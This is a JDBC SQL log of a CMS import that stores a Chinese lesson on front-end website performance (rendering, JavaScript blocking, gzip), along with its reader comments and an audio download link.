data-key="1184"><span data-slate-leaf="true" data-offset-key="1184:0" data-first-offset="true"><span 
data-slate-string="true">2. 减少渲染次数</span></span></span></h3> <div class="se-408ffdd7 " data-slate-type="paragraph" 
data-slate-object="block" data-key="1185"> <span data-slate-object="text" data-key="1186"><span 
data-slate-leaf="true" data-offset-key="1186:0" data-first-offset="true"><span data-slate-string="true">CSS 
或者 DOM 的变化都会引发渲染，而渲染是由单独的线程来进行的，这个过程会阻塞用户的操作。对于较大的页面、DOM 较多的页面，浏览器渲染会占用大量的 CPU 并带来明显的停顿时间。</span></span></span> 
</div> <div class="se-a5939b2c " data-slate-type="paragraph" data-slate-object="block" data-key="1187"> 
<span data-slate-object="text" data-key="1188"><span data-slate-leaf="true" data-offset-key="1188:0" 
data-first-offset="true"><span data-slate-string="true">渲染其实包括两种，一种是 reflow，就是页面元素的位置、间隔等等发生更改，这个工作是由 
CPU 完成的；另一种叫做 repaint，基本上就是当颜色等发生变更的时候就需要重新绘制，这个工作是由 GPU 完成的。</span></span></span> </div> <div 
class="se-6b6cd52d " data-slate-type="paragraph" data-slate-object="block" data-key="1189"> 
<span data-slate-object="text" data-key="1190"><span data-slate-leaf="true" data-offset-key="1190:0" 
data-first-offset="true"><span data-slate-string="true">因此，如果我们能够减少反复、多次，或是无意义的渲染，就可以在一定程度上为 
Web 应用提速，特别是 reflow。那么对于这方面优化的其中一个思路，就是合并操作，即可以合并多个 DOM 操作为一次进行，或是合并单个 DOM 的多次操作为一次进行（React 
或者 Vue.js 的 Virtual DOM 技术就借鉴了这种思路）。</span></span></span> </div> <h3 class="se-89e6bfff" data-slate-type="heading" 
data-slate-object="block" data-key="1191"><span data-slate-object="text" data-key="1192"><span 
data-slate-leaf="true" data-offset-key="1192:0" data-first-offset="true"><span data-slate-string="true">3. 
减少 JavaScript 阻塞</span></span></span></h3> <div class="se-c109c5b4 " data-slate-type="paragraph" 
data-slate-object="block" data-key="1193"> <span data-slate-object="text" data-key="1194"><span 
data-slate-leaf="true" data-offset-key="1194:0" data-first-offset="true"><span data-slate-string="true">JavaScript 
阻塞，本质上是由于 JavaScript 解释执行是单线程所造成的，阻塞期间浏览器拒绝响应用户的操作。同步的 Ajax 调用会引发阻塞（一直阻塞到响应返回），耗时的 JavaScript 
代码执行也会引起阻塞。</span></span></span> </div> <div class="se-002b977c " data-slate-type="paragraph" 
data-slate-object="block" data-key="1195"> <span data-slate-object="text" data-key="1196"><span 
data-slate-leaf="true" data-offset-key="1196:0" data-first-offset="true"><span data-slate-string="true">我们通过将大的工作分裂成多次执行（可以通过每次具备一定间隔时间的回调来实现），每次执行后主动让出执行线程，这样每次就可以只阻塞一小会儿，以显著减少 
JavaScript 阻塞对用户造成的影响；而对于一些独立的耗时操作，可以引入 </span></span></span><a data-slate-type="link" data-slate-object="inline" 
data-key="1197" class="se-bd361ee3 se-f81bfce9"><span data-slate-object="text" data-key="1198"><span 
data-slate-leaf="true" data-offset-key="1198:0" data-first-offset="true"><span data-slate-string="true">Web 
Worker</span></span></span></a><span data-slate-object="text" data-key="1199"><span data-slate-leaf="true" 
data-offset-key="1199:0" data-first-offset="true"><span data-slate-string="true"> 分配单独运行的线程来完成。</span></span></span> 
</div> <h3 class="se-047c2833" data-slate-type="heading" data-slate-object="block" data-key="1200"><span 
data-slate-object="text" data-key="1201"><span data-slate-leaf="true" data-offset-key="1201:0" 
data-first-offset="true"><span data-slate-string="true">4. 文本消息压缩</span></span></span></h3> 
<div class="se-8433d25b " data-slate-type="paragraph" data-slate-object="block" data-key="1202"> 
<span data-slate-object="text" data-key="1203"><span data-slate-leaf="true" data-offset-key="1203:0" 
data-first-offset="true"><span data-slate-string="true">对于页面这样的文本内容，通过配置 Web 容器的 gzip 压缩，可以获得很好的压缩比，从而减小消息体的大小，减少消息传输的时间，代价是压缩和解压缩需要消耗 
CPU 时间。</span></span></span> </div> <div class="se-425bfe95 " data-slate-type="paragraph" data-slate-object="block" 
data-key="1204"> <span data-slate-object="text" data-key="1205"><span data-slate-leaf="true" 
data-offset-key="1205:0" data-first-offset="true"><span class="se-fa55b3e6" data-slate-type="bold" 
data-slate-object="mark"><span data-slate-string="true">这种优化的本质是时间换空间，而前面介绍过的缓存本质则是空间换时间</span></span></span></span><span 
data-slate-object="text" data-key="1206"><span data-slate-leaf="true" data-offset-key="1206:0" 
data-first-offset="true"><span data-slate-string="true">，二者比起来，刚好是相反的。可有趣的是，它们的目的却是一致的，都是为了缩短用户访问的时间，都是为了减少延迟。</span></span></span> 
</div> <div class="se-c6660aca " data-slate-type="paragraph" data-slate-object="block" data-key="1207"> 
<span data-slate-object="text" data-key="1208"><span data-slate-leaf="true" data-offset-key="1208:0" 
data-first-offset="true"><span data-slate-string="true">对于前端的优化，技巧比较零散，可能有不少朋友会想起那最著名的 </span></span></span><a 
data-slate-type="link" data-slate-object="inline" data-key="1209" class="se-bd361ee3 se-f81bfce9"><span 
data-slate-object="text" data-key="1210"><span data-slate-leaf="true" data-offset-key="1210:0" 
data-first-offset="true"><span data-slate-string="true">35 条军规</span></span></span></a><span 
data-slate-object="text" data-key="1211"><span data-slate-leaf="true" data-offset-key="1211:0" 
data-first-offset="true"><span data-slate-string="true">（中文译文有不少，比如</span></span></span><a 
data-slate-type="link" data-slate-object="inline" data-key="1212" class="se-bd361ee3 se-f81bfce9"><span 
data-slate-object="text" data-key="1213"><span data-slate-leaf="true" data-offset-key="1213:0" 
data-first-offset="true"><span data-slate-string="true">这里</span></span></span></a><span data-slate-object="text" 
data-key="1214"><span data-slate-leaf="true" data-offset-key="1214:0" data-first-offset="true"><span 
data-slate-string="true">），这篇文章是如今很多前端技能优化学习首先要阅读的“老文章”了。</span></span></span> </div> <h2 class="se-b407d3b1" 
data-slate-type="heading" data-slate-object="block" data-key="1215"><span data-slate-object="text" 
data-key="1216"><span data-slate-leaf="true" data-offset-key="1216:0" data-first-offset="true"><span 
data-slate-string="true">总结思考</span></span></span></h2> <div class="se-0afb2195 " data-slate-type="paragraph" 
data-slate-object="block" data-key="1217"> <span data-slate-object="text" data-key="1218"><span 
data-slate-leaf="true" data-offset-key="1218:0" data-first-offset="true"><span data-slate-string="true">今天我从产品和架构、后端和持久化，以及前端和网络层三个角度，结合一些具体的技巧，向你介绍了一些常见的网站性能优化方法。网站的性能优化是一个大课题，希望你在学完上一讲和这一讲之后，你能从前到后比较全面地去分析和思考问题。</span></span></span> 
</div> <div class="se-8c978c27 " data-slate-type="paragraph" data-slate-object="block" data-key="1219"> 
<span data-slate-object="text" data-key="1220"><span data-slate-leaf="true" data-offset-key="1220:0" 
data-first-offset="true"><span data-slate-string="true">下面我来提两个问题吧：</span></span></span> </div> 
<div class="se-c3193518" data-slate-type="list" data-slate-object="block" data-key="1221"> 
<div class="se-91ed3846 se-6602e272" data-slate-type="list-line" data-slate-object="block" 
data-key="1222"> <span data-slate-object="text" data-key="1223"><span data-slate-leaf="true" 
data-offset-key="1223:0" data-first-offset="true"><span data-slate-string="true">你在项目中是否做过性能优化的工作，能否介绍一下你都进行了哪些有效的优化实践呢？</span></span></span> 
</div> <div class="se-f0c70cc0 se-b31d1a0f" data-slate-type="list-line" data-slate-object="block" 
data-key="1224"> <span data-slate-object="text" data-key="1225"><span data-slate-leaf="true" 
data-offset-key="1225:0" data-first-offset="true"><span data-slate-string="true">文中介绍了数据库表拆分的两种方式，水平拆分和垂直拆分，它们都带来了显而易见的好处。可是，我们总是需要辩证地去看待一项技术，你能说出它们会带来哪些坏处吗？</span></span></span> 
</div> </div> <h2 class="se-f85d16c7" data-slate-type="heading" data-slate-object="block" data-key="1226"><span 
data-slate-object="text" data-key="1227"><span data-slate-leaf="true" data-offset-key="1227:0" 
data-first-offset="true"><span data-slate-string="true">扩展阅读</span></span></span></h2> <div 
class="se-9eca27db" data-slate-type="list" data-slate-object="block" data-key="1228"> <div 
class="se-139cfaf4 se-c4a85144" data-slate-type="list-line" data-slate-object="block" data-key="1229"> 
<span data-slate-object="text" data-key="1230"><span data-slate-leaf="true" data-offset-key="1230:0" 
data-first-offset="true"><span data-slate-string="true">文中提到了 Amazon 对于 SOA 的实践，你可以阅读</span></span></span><a 
data-slate-type="link" data-slate-object="inline" data-key="1231" class="se-bd361ee3 se-f81bfce9"><span 
data-slate-object="text" data-key="1232"><span data-slate-leaf="true" data-offset-key="1232:0" 
data-first-offset="true"><span data-slate-string="true">这篇文章</span></span></span></a><span 
data-slate-object="text" data-key="1233"><span data-slate-leaf="true" data-offset-key="1233:0" 
data-first-offset="true"><span data-slate-string="true">简单了解一下这个故事。</span></span></span> </div> 
<div class="se-bd574342 se-4036514b" data-slate-type="list-line" data-slate-object="block" 
data-key="1234"> <span data-slate-object="text" data-key="1235"><span data-slate-leaf="true" 
data-offset-key="1235:0" data-first-offset="true"><span data-slate-string="true">本文主要讲的还是应用层面的调优，没有介绍虚拟机、容器等性能优化和操作系统的性能优化。如果你对它们感兴趣的话，我在这里推荐两个材料。关于 
JVM 调优，可以参看 </span></span></span><a data-slate-type="link" data-slate-object="inline" data-key="1236" 
class="se-bd361ee3 se-f81bfce9"><span data-slate-object="text" data-key="1237"><span data-slate-leaf="true" 
data-offset-key="1237:0" data-first-offset="true"><span data-slate-string="true">Java 应用性能调优实践</span></span></span></a><span 
data-slate-object="text" data-key="1238"><span data-slate-leaf="true" data-offset-key="1238:0" 
data-first-offset="true"><span data-slate-string="true">这篇，而操作系统层面的性能优化，你可以从 </span></span></span><a 
data-slate-type="link" data-slate-object="inline" data-key="1239" class="se-bd361ee3 se-f81bfce9"><span 
data-slate-object="text" data-key="1240"><span data-slate-leaf="true" data-offset-key="1240:0" 
data-first-offset="true"><span data-slate-string="true">Linux 性能调优指南</span></span></span></a><span 
data-slate-object="text" data-key="1241"><span data-slate-leaf="true" data-offset-key="1241:0" 
data-first-offset="true"><span data-slate-string="true">这个材料中找感兴趣的阅读。</span></span></span> 
</div> <div class="se-1ad822f6 se-a2998807" data-slate-type="list-line" data-slate-object="block" 
data-key="1242"> <a data-slate-type="link" data-slate-object="inline" data-key="1243" class="se-bd361ee3 
se-f81bfce9"><span data-slate-object="text" data-key="1244"><span data-slate-leaf="true" data-offset-key="1244:0" 
data-first-offset="true"><span data-slate-string="true">从 Webkit 内部渲染机制出发，谈网站渲染性能优化</span></span></span></a><span 
data-slate-object="text" data-key="1245"><span data-slate-leaf="true" data-offset-key="1245:0" 
data-first-offset="true"><span data-slate-string="true">，这篇文章是从浏览器的机制这个角度来讲性能优化的，推荐一读。</span></span></span> 
</div> <div class="se-22ed3d8c se-04c89fbe" data-slate-type="list-line" data-slate-object="block" 
data-key="1246"> <span data-slate-object="text" data-key="1247"><span data-slate-leaf="true" 
data-offset-key="1247:0" data-first-offset="true"><span data-slate-string="true">文中介绍了 reflow 
和 repaint，对于这方面的优化可以阅读 </span></span></span><a data-slate-type="link" data-slate-object="inline" 
data-key="1248" class="se-bd361ee3 se-f81bfce9"><span data-slate-object="text" data-key="1249"><span 
data-slate-leaf="true" data-offset-key="1249:0" data-first-offset="true"><span data-slate-string="true">reflow 
和 repaint 引发的性能问题</span></span></span></a><span data-slate-object="text" data-key="1250"><span 
data-slate-leaf="true" data-offset-key="1250:0" data-first-offset="true"><span data-slate-string="true">这篇文章。</span></span></span> 
</div> </div> <div class="se-87d2343b" data-slate-type="image" data-slate-object="block" data-key="1251"> 
<img class="se-09bc7f01" src="https://static001.geekbang.org/resource/image/11/8b/1181246bbd51ce348d5729696d1dc28b.jpg"> 
</div> </div>', '', 'book', 0, 'full_html', 'zh-hans', 10, 10) 
 {executed in 10 msec}
2020-11-19 11:05:09.451 INFO  jdbc.sqltiming Line:373 - select nodefiledd0_.nid as nid1_9_, nodefiledd0_.changed as changed2_9_, nodefiledd0_.created 
as created3_9_, nodefiledd0_.default_langcode as default_4_9_, nodefiledd0_.langcode as langcode5_9_, 
nodefiledd0_.promote as promote6_9_, nodefiledd0_.revision_translation_affected as revision7_9_, 
nodefiledd0_.status as status8_9_, nodefiledd0_.sticky as sticky9_9_, nodefiledd0_.title as 
title10_9_, nodefiledd0_.type as type11_9_, nodefiledd0_.uid as uid12_9_, nodefiledd0_.vid 
as vid13_9_ from node_field_data nodefiledd0_ where nodefiledd0_.nid=10 
 {executed in 0 msec}
2020-11-19 11:05:09.451 INFO  jdbc.resultsettable Line:610 - 
|----|--------|--------|-----------------|---------|--------|------------------------------|-------|-------|------|-----|----|----|
|nid |changed |created |default_langcode |langcode |promote |revision_translation_affected |status |sticky |title |type |uid |vid |
|----|--------|--------|-----------------|---------|--------|------------------------------|-------|-------|------|-----|----|----|
|----|--------|--------|-----------------|---------|--------|------------------------------|-------|-------|------|-----|----|----|

2020-11-19 11:05:09.452 INFO  jdbc.sqltiming Line:373 - select nodefieldr0_.nid as nid1_10_0_, nodefieldr0_.changed as changed2_10_0_, nodefieldr0_.created 
as created3_10_0_, nodefieldr0_.default_langcode as default_4_10_0_, nodefieldr0_.langcode 
as langcode5_10_0_, nodefieldr0_.promote as promote6_10_0_, nodefieldr0_.revision_translation_affected 
as revision7_10_0_, nodefieldr0_.status as status8_10_0_, nodefieldr0_.sticky as sticky9_10_0_, 
nodefieldr0_.title as title10_10_0_, nodefieldr0_.uid as uid11_10_0_, nodefieldr0_.vid as vid12_10_0_ 
from node_field_revision nodefieldr0_ where nodefieldr0_.nid=10 
 {executed in 0 msec}
2020-11-19 11:05:09.453 INFO  jdbc.resultsettable Line:610 - 
|----|--------|--------|-----------------|---------|--------|------------------------------|-------|-------|------|----|----|
|nid |changed |created |default_langcode |langcode |promote |revision_translation_affected |status |sticky |title |uid |vid |
|----|--------|--------|-----------------|---------|--------|------------------------------|-------|-------|------|----|----|
|----|--------|--------|-----------------|---------|--------|------------------------------|-------|-------|------|----|----|

2020-11-19 11:05:09.453 INFO  jdbc.sqltiming Line:373 - insert into node_field_revision (changed, created, default_langcode, langcode, promote, revision_translation_affected, 
status, sticky, title, uid, vid, nid) values (1605755109, 1605755109, 1, 'zh-hans', 0, 1, 1, 
0, '35丨网站性能优化（下）', 1, 10, 10) 
 {executed in 0 msec}
2020-11-19 11:05:09.456 INFO  jdbc.sqltiming Line:373 - select nodefiledd0_.nid as nid1_9_0_, nodefiledd0_.changed as changed2_9_0_, nodefiledd0_.created 
as created3_9_0_, nodefiledd0_.default_langcode as default_4_9_0_, nodefiledd0_.langcode as 
langcode5_9_0_, nodefiledd0_.promote as promote6_9_0_, nodefiledd0_.revision_translation_affected 
as revision7_9_0_, nodefiledd0_.status as status8_9_0_, nodefiledd0_.sticky as sticky9_9_0_, 
nodefiledd0_.title as title10_9_0_, nodefiledd0_.type as type11_9_0_, nodefiledd0_.uid as uid12_9_0_, 
nodefiledd0_.vid as vid13_9_0_ from node_field_data nodefiledd0_ where nodefiledd0_.nid=10 
 {executed in 0 msec}
2020-11-19 11:05:09.457 INFO  jdbc.resultsettable Line:610 - 
|----|--------|--------|-----------------|---------|--------|------------------------------|-------|-------|------|-----|----|----|
|nid |changed |created |default_langcode |langcode |promote |revision_translation_affected |status |sticky |title |type |uid |vid |
|----|--------|--------|-----------------|---------|--------|------------------------------|-------|-------|------|-----|----|----|
|----|--------|--------|-----------------|---------|--------|------------------------------|-------|-------|------|-----|----|----|

2020-11-19 11:05:09.458 INFO  jdbc.sqltiming Line:373 - insert into node_field_data (changed, created, default_langcode, langcode, promote, revision_translation_affected, 
status, sticky, title, type, uid, vid, nid) values (1605755109, 1605755109, 1, 'zh-hans', 0, 
1, 1, 0, '35丨网站性能优化（下）', 'book', 1, 10, 10) 
 {executed in 1 msec}
2020-11-19 11:05:09.460 INFO  jdbc.sqltiming Line:373 - select bookfieldm0_.entity_id as entity_i1_7_, bookfieldm0_.bundle as bundle2_7_, bookfieldm0_.delta 
as delta3_7_, bookfieldm0_.langcode as langcode4_7_, bookfieldm0_.field_media_value as field_me5_7_, 
bookfieldm0_.revision_id as revision6_7_ from node__field_media bookfieldm0_ where bookfieldm0_.entity_id=10 
 {executed in 0 msec}
2020-11-19 11:05:09.461 INFO  jdbc.resultsettable Line:610 - 
|----------|-------|------|---------|------------------|------------|
|entity_id |bundle |delta |langcode |field_media_value |revision_id |
|----------|-------|------|---------|------------------|------------|
|----------|-------|------|---------|------------------|------------|

2020-11-19 11:05:09.462 INFO  jdbc.sqltiming Line:373 - select bookfieldm0_.entity_id as entity_i1_7_0_, bookfieldm0_.bundle as bundle2_7_0_, bookfieldm0_.delta 
as delta3_7_0_, bookfieldm0_.langcode as langcode4_7_0_, bookfieldm0_.field_media_value as 
field_me5_7_0_, bookfieldm0_.revision_id as revision6_7_0_ from node__field_media bookfieldm0_ 
where bookfieldm0_.entity_id=10 
 {executed in 0 msec}
2020-11-19 11:05:09.462 INFO  jdbc.resultsettable Line:610 - 
|----------|-------|------|---------|------------------|------------|
|entity_id |bundle |delta |langcode |field_media_value |revision_id |
|----------|-------|------|---------|------------------|------------|
|----------|-------|------|---------|------------------|------------|

2020-11-19 11:05:09.463 INFO  jdbc.sqltiming Line:373 - insert into node__field_media (bundle, delta, langcode, field_media_value, revision_id, entity_id) 
values ('book', 0, 'zh-hans', 'https://qdall01.baidupcs.com/file/db4a415827dca47165c8f2bdd8cc50f3?bkt=en-d3a65691252603d3a59de0fa6f6a9d420394f4483ffd7963666027dbc09f9555eed8033d94e1d3c3&fid=3757516097-778750-732850559698198&time=1605755108&sign=FDTAXUGERLQlBHSKfWqir-DCb740ccc5511e5e8fedcff06b081203-xaGAPCM2VaGp9hnzAZCVhszpXX0%3D&to=92&size=15823735&sta_dx=15823735&sta_cs=3060&sta_ft=m4a&sta_ct=6&sta_mt=0&fm2=MH%2CYangquan%2CAnywhere%2C%2Cshanghai%2Cct&ctime=1575279293&mtime=1605754778&resv0=-1&resv1=0&resv2=rlim&resv3=2&resv4=15823735&vuk=3757516097&iv=0&htype=&randtype=em&newver=1&newfm=1&secfm=1&flow_ver=3&pkey=en-8c10535de7231cf82296cb5702d70da3335f7e377c9561deba921612a7baa19961d97adfff6ab679&sl=76480590&expires=8h&rt=pr&r=478128754&mlogid=7501994590480187187&vbdid=2247232042&fin=35%E4%B8%A8%E7%BD%91%E7%AB%99%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96%EF%BC%88%E4%B8%8B%EF%BC%89.m4a&bflag=92,34-92&rtype=1&dp-logid=7501994590480187187&dp-callid=0.1.1&hps=1&tsl=80&csl=80&fsl=-1&csign=yVzLQPCt4DblfMLqd2BCjd2RnqQ%3D&so=0&ut=6&uter=0&serv=0&uc=1458616558&ti=9cf67ec2c4eb6cc07489adcd7319bfb876fd22be1fa70537&hflag=30&adg=c_15d187590626c675056c89c8026cfc17&reqlabel=778750_l_1bf9445f27094ab64c9f1cb0bdf7ccfa_-1_dd2c452b8e51a0c74130d7cf32c48a2d&ibp=1&by=themis&filename=35%E4%B8%A8%E7%BD%91%E7%AB%99%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96%EF%BC%88%E4%B8%8B%EF%BC%89.m4a', 
10, 10) 
 {executed in 0 msec}
2020-11-19 11:05:09.466 INFO  jdbc.sqltiming Line:373 - select nodefieldm0_.entity_id as entity_i1_16_0_, nodefieldm0_.bundle as bundle2_16_0_, nodefieldm0_.delta 
as delta3_16_0_, nodefieldm0_.langcode as langcode4_16_0_, nodefieldm0_.field_media_value as 
field_me5_16_0_, nodefieldm0_.revision_id as revision6_16_0_ from node_revision__field_media 
nodefieldm0_ where nodefieldm0_.entity_id=10 
 {executed in 0 msec}
2020-11-19 11:05:09.467 INFO  jdbc.resultsettable Line:610 - 
|----------|-------|------|---------|------------------|------------|
|entity_id |bundle |delta |langcode |field_media_value |revision_id |
|----------|-------|------|---------|------------------|------------|
|----------|-------|------|---------|------------------|------------|

2020-11-19 11:05:09.467 INFO  jdbc.sqltiming Line:373 - insert into node_revision__field_media (bundle, delta, langcode, field_media_value, revision_id, 
entity_id) values ('book', 0, 'zh-hans', 'https://qdall01.baidupcs.com/file/db4a415827dca47165c8f2bdd8cc50f3?bkt=en-d3a65691252603d3a59de0fa6f6a9d420394f4483ffd7963666027dbc09f9555eed8033d94e1d3c3&fid=3757516097-778750-732850559698198&time=1605755108&sign=FDTAXUGERLQlBHSKfWqir-DCb740ccc5511e5e8fedcff06b081203-xaGAPCM2VaGp9hnzAZCVhszpXX0%3D&to=92&size=15823735&sta_dx=15823735&sta_cs=3060&sta_ft=m4a&sta_ct=6&sta_mt=0&fm2=MH%2CYangquan%2CAnywhere%2C%2Cshanghai%2Cct&ctime=1575279293&mtime=1605754778&resv0=-1&resv1=0&resv2=rlim&resv3=2&resv4=15823735&vuk=3757516097&iv=0&htype=&randtype=em&newver=1&newfm=1&secfm=1&flow_ver=3&pkey=en-8c10535de7231cf82296cb5702d70da3335f7e377c9561deba921612a7baa19961d97adfff6ab679&sl=76480590&expires=8h&rt=pr&r=478128754&mlogid=7501994590480187187&vbdid=2247232042&fin=35%E4%B8%A8%E7%BD%91%E7%AB%99%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96%EF%BC%88%E4%B8%8B%EF%BC%89.m4a&bflag=92,34-92&rtype=1&dp-logid=7501994590480187187&dp-callid=0.1.1&hps=1&tsl=80&csl=80&fsl=-1&csign=yVzLQPCt4DblfMLqd2BCjd2RnqQ%3D&so=0&ut=6&uter=0&serv=0&uc=1458616558&ti=9cf67ec2c4eb6cc07489adcd7319bfb876fd22be1fa70537&hflag=30&adg=c_15d187590626c675056c89c8026cfc17&reqlabel=778750_l_1bf9445f27094ab64c9f1cb0bdf7ccfa_-1_dd2c452b8e51a0c74130d7cf32c48a2d&ibp=1&by=themis&filename=35%E4%B8%A8%E7%BD%91%E7%AB%99%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96%EF%BC%88%E4%B8%8B%EF%BC%89.m4a', 
10, 10) 
 {executed in 0 msec}
2020-11-19 11:05:09.470 INFO  jdbc.sqltiming Line:373 - select bookfieldc0_.entity_id as entity_i1_4_, bookfieldc0_.bundle as bundle2_4_, bookfieldc0_.field_comment_value 
as field_co3_4_, bookfieldc0_.delta as delta4_4_, bookfieldc0_.field_comment_format as field_co5_4_, 
bookfieldc0_.langcode as langcode6_4_, bookfieldc0_.revision_id as revision7_4_ from node__field_comment 
bookfieldc0_ where bookfieldc0_.entity_id=10 
 {executed in 0 msec}
2020-11-19 11:05:09.470 INFO  jdbc.resultsettable Line:610 - 
|----------|-------|--------------------|------|---------------------|---------|------------|
|entity_id |bundle |field_comment_value |delta |field_comment_format |langcode |revision_id |
|----------|-------|--------------------|------|---------------------|---------|------------|
|----------|-------|--------------------|------|---------------------|---------|------------|

2020-11-19 11:05:09.471 INFO  jdbc.sqltiming Line:373 - select bookfieldc0_.entity_id as entity_i1_4_0_, bookfieldc0_.bundle as bundle2_4_0_, bookfieldc0_.field_comment_value 
as field_co3_4_0_, bookfieldc0_.delta as delta4_4_0_, bookfieldc0_.field_comment_format as 
field_co5_4_0_, bookfieldc0_.langcode as langcode6_4_0_, bookfieldc0_.revision_id as revision7_4_0_ 
from node__field_comment bookfieldc0_ where bookfieldc0_.entity_id=10 
 {executed in 0 msec}
2020-11-19 11:05:09.471 INFO  jdbc.resultsettable Line:610 - 
|----------|-------|--------------------|------|---------------------|---------|------------|
|entity_id |bundle |field_comment_value |delta |field_comment_format |langcode |revision_id |
|----------|-------|--------------------|------|---------------------|---------|------------|
|----------|-------|--------------------|------|---------------------|---------|------------|

2020-11-19 11:05:09.476 INFO  jdbc.sqltiming Line:373 - insert into node__field_comment (bundle, field_comment_value, delta, field_comment_format, 
langcode, revision_id, entity_id) values ('book', '<li class="reJj6Thl_0"><img src="https://static001.geekbang.org/account/avatar/00/0f/7c/16/38c07a04.jpg" 
class="_2273kGdT_0"> <div class="_2CG0SquK_0"> <div class="_304R4gla_0"> <div> <div class="_18Dng5rT_0"> 
<a>_CountingStars</a> <!----> </div> <div class="_1H1Z49Dr_0"> 2019-11-29 </div> </div> <!----> 
</div> <div> <div class="_3M6kV3zb_0"> 如果使用了 HTTP/2 协议 “ 减少请求次数” 这条优化建议里把多文件压缩成一个可以不用做了，甚至做了会使用性能变慢。 
</div> <div class="_2r3UB1GX_0"> <span>展开</span><i class="iconfont"></i> </div> <div class="_2xNIY4NG_0"> 
<p class="_33BLbmw4_0">作者回复: 是的，你说的很对。实际上，HTTP/2 就是对于之前 1.1 版本“填坑”的问题，提高了性能，还解决了安全性等问题。</p> 
</div> <div class="_1w8H0ktn_0 _2A421P4G_0"> <div class="_2jsFl-X0_0"> <i class="iconfont"></i> 
<span></span> </div> <div class="_2P4B1Hdm_0"> <i class="iconfont"></i> <span class=""></span> 
</div> <!----> </div> </div> </div></li> <li class="reJj6Thl_0"><img src="https://static001.geekbang.org/account/avatar/00/13/db/26/54f2c164.jpg" 
class="_2273kGdT_0"> <div class="_2CG0SquK_0"> <div class="_304R4gla_0"> <div> <div class="_18Dng5rT_0"> 
<a>靠人品去赢</a> <!----> </div> <div class="_1H1Z49Dr_0"> 2019-11-29 </div> </div> <!----> </div> 
<div> <div class="_3M6kV3zb_0"> 老哥，你这文章真的稳。 </div> <div class="_2r3UB1GX_0"> <span>展开</span><i 
class="iconfont"></i> </div> <!----> <div class="_1w8H0ktn_0 _2A421P4G_0"> <div class="_2jsFl-X0_0"> 
<i class="iconfont"></i> <span></span> </div> <div class="_2P4B1Hdm_0"> <i class="iconfont"></i> 
<span class=""></span> </div> <!----> </div> </div> </div></li> <li class="reJj6Thl_0"><img 
src="https://static001.geekbang.org/account/avatar/00/14/34/df/64e3d533.jpg" class="_2273kGdT_0"> 
<div class="_2CG0SquK_0"> <div class="_304R4gla_0"> <div> <div class="_18Dng5rT_0"> <a>leslie</a> 
<!----> </div> <div class="_1H1Z49Dr_0"> 2019-11-29 </div> </div> <!----> </div> <div> <div 
class="_3M6kV3zb_0"> 数据库如果需要做垂直拆分不少都是早期的设计上的坑：一口气吃成胖子或者没想到后期的扩展性，水平拆分倒是一种常态-数据量过大造成的。垂直拆分其实最被动：涉及到大量的代码修改；相对比而言水平拆分的代价就小许多。 
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Javascripe的坑有时同样蛮大的：故而其实如何合理使用任何一个部件需要整体的思考，否则经常容易把某个部件用爆了。 
</div> <div class="_2r3UB1GX_0"> <span>展开</span><i class="iconfont"></i> </div> <div class="_2xNIY4NG_0"> 
<p class="_33BLbmw4_0">作者回复: 关于拆分，我想补充的是，拆分有时候也是不可避免的，本来设计就是一个循序渐进的过程，最开始确实要避免过度设计。到后来随着业务的发展再来拆分也未必是一件坏事。</p> 
</div> <div class="_1w8H0ktn_0 _2A421P4G_0"> <div class="_2jsFl-X0_0"> <i class="iconfont"></i> 
<span></span> </div> <div class="_2P4B1Hdm_0"> <i class="iconfont"></i> <span class=""></span> 
</div> <!----> </div> </div> </div></li>', 0, 'full_html', 'zh-hans', 10, 10) 
 {executed in 4 msec}
2020-11-19 11:05:09.479 INFO  jdbc.sqltiming Line:373 - select nodefieldc0_.entity_id as entity_i1_13_0_, nodefieldc0_.bundle as bundle2_13_0_, nodefieldc0_.field_comment_value 
as field_co3_13_0_, nodefieldc0_.delta as delta4_13_0_, nodefieldc0_.field_comment_format as 
field_co5_13_0_, nodefieldc0_.langcode as langcode6_13_0_, nodefieldc0_.revision_id as revision7_13_0_ 
from node_revision__field_comment nodefieldc0_ where nodefieldc0_.entity_id=10 
 {executed in 0 msec}
2020-11-19 11:05:09.480 INFO  jdbc.resultsettable Line:610 - 
|----------|-------|--------------------|------|---------------------|---------|------------|
|entity_id |bundle |field_comment_value |delta |field_comment_format |langcode |revision_id |
|----------|-------|--------------------|------|---------------------|---------|------------|
|----------|-------|--------------------|------|---------------------|---------|------------|

2020-11-19 11:05:09.485 INFO  jdbc.sqltiming Line:373 - insert into node_revision__field_comment (bundle, field_comment_value, delta, field_comment_format, 
langcode, revision_id, entity_id) values ('book', '<li class="reJj6Thl_0"><img src="https://static001.geekbang.org/account/avatar/00/0f/7c/16/38c07a04.jpg" 
class="_2273kGdT_0"> <div class="_2CG0SquK_0"> <div class="_304R4gla_0"> <div> <div class="_18Dng5rT_0"> 
<a>_CountingStars</a> <!----> </div> <div class="_1H1Z49Dr_0"> 2019-11-29 </div> </div> <!----> 
</div> <div> <div class="_3M6kV3zb_0"> 如果使用了 HTTP/2 协议 “ 减少请求次数” 这条优化建议里把多文件压缩成一个可以不用做了，甚至做了会使用性能变慢。 
</div> <div class="_2r3UB1GX_0"> <span>展开</span><i class="iconfont"></i> </div> <div class="_2xNIY4NG_0"> 
<p class="_33BLbmw4_0">作者回复: 是的，你说的很对。实际上，HTTP/2 就是对于之前 1.1 版本“填坑”的问题，提高了性能，还解决了安全性等问题。</p> 
</div> <div class="_1w8H0ktn_0 _2A421P4G_0"> <div class="_2jsFl-X0_0"> <i class="iconfont"></i> 
<span></span> </div> <div class="_2P4B1Hdm_0"> <i class="iconfont"></i> <span class=""></span> 
</div> <!----> </div> </div> </div></li> <li class="reJj6Thl_0"><img src="https://static001.geekbang.org/account/avatar/00/13/db/26/54f2c164.jpg" 
class="_2273kGdT_0"> <div class="_2CG0SquK_0"> <div class="_304R4gla_0"> <div> <div class="_18Dng5rT_0"> 
<a>靠人品去赢</a> <!----> </div> <div class="_1H1Z49Dr_0"> 2019-11-29 </div> </div> <!----> </div> 
<div> <div class="_3M6kV3zb_0"> 老哥，你这文章真的稳。 </div> <div class="_2r3UB1GX_0"> <span>展开</span><i 
class="iconfont"></i> </div> <!----> <div class="_1w8H0ktn_0 _2A421P4G_0"> <div class="_2jsFl-X0_0"> 
